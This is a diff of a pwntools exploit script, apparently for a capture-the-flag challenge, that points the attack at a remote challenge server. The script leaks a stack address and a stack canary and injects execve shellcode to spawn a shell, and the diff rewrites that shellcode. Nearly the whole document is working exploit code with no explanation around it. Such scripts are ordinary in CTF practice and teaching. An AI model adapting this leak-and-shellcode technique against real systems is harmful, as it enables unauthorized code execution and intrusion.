@@ -2,11 +2,11 @@ from pwn import *
 
 binary = "./program"
 context.arch = 'amd64'
-p = process(binary)
-#p = remote("chal.firebird.sh", 35028)
+#p = process(binary)
+p = remote("chal.firebird.sh", 35028)
 context.log_level = 'debug'
 s = 'b* UwU_main+546'
-gdb.attach(p, s)
+#gdb.attach(p, s)
 p.recvuntil("0x")
 leak_addr = int(b'0x' + p.recvuntil(b' ', drop = True), 16)
 shellcode_addr = leak_addr + 0x18 + 8 + 8
@@ -21,11 +21,11 @@ shellcode_addr = leak_addr + 0x18 + 8 + 8
 print(f"Leaked address: {hex(leak_addr)}")
 print(f"Canary: {hex(canary)}")
 
-                            
+
 shellcode1 = asm("""
-xor rsi, rsi            
-xor rdx, rdx            
-mov rdi, rcx            
+xor esi, esi            
+cdq
+lea rdi, [rsp-0x20]
 mov al, 0x3b            
 syscall                
 """)   
